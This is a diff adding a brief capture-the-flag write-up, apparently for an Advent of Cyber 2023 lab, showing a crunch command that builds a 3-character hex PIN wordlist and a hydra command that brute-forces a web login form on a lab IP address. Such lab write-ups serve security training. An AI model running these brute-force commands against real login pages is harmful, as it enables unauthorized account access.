@@ -1,0 +1,17 @@
+# Day 2
+
+![image](https://github.com/PolGs/THM-Advent-of-Cyber-2023/assets/19478700/86c03667-b93e-4e16-9d02-74c409f88ea6)
+![image](https://github.com/PolGs/THM-Advent-of-Cyber-2023/assets/19478700/1c81a9f1-4649-4232-b609-8eabad750d2a)
+
+
+## Generating password wordlist with crunch
+```s
+crunch 3 3 0123456789ABCDEF -o 3digits.txt
+```
+
+## Cracking with hydra
+```s
+hydra -l '' -P 3digits.txt -f -v 10.10.174.107 http-post-form "/login.php:pin=^PASS^:Access denied" -s 8000
+```
+
+
